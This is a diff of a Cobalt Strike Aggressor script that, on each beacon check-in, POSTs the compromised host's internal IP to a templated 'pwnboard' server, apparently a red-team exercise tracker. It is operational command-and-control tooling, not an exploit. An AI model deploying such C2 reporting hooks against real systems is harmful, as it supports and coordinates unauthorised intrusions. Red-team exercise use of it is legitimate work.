@@ -1,29 +1,16 @@
 #
-# Save this file as a CNA file and load the script into Cobalt Strike
+# Save this file as a ags file and load the script into Cobalt Strike
 # Everytime a beacon calls back the pwnboard will be updated
 #
-
-sub updatePwnBoard {
-    local('$pwnboard_url')
+sub update_pwnboard {
+    local('$pwnboard_url @curl_command');
     $pwnboard_url = '{{ server }}/generic';
-    @curl_command = @('curl','-X','POST',
-	'-H', 'Content-Type: application/json',
-	'-d', '{"ip":"$1","type":"cobaltstrike"}', $pwnboard_url);
+    @curl_command = @('curl','-X','POST', '-H', 'Content-Type: application/json', '-d', '{"ip":"' . $2 . '","type":"cobaltstrike"}', $pwnboard_url);
     exec(@curl_command);
 }
-
-on beacon_initial {
-    local('$internal $os');
-    $internal = beacon_info($1, "internal");
-    $os = beacon_info($1, "os");
-    updatePwnBoard("$internal")
-    bcheckin($beacon);
-}
-
 on beacon_checkin {
-    local('$internal $os');
+    local('$internal');
     $internal = beacon_info($1, "internal");
-    $os = beacon_info($1, "os");
-    updatePwnBoard("$internal")
-    bcheckin($beacon);
+    update_pwnboard($1, $internal);
+    bcheckin($1);
 }
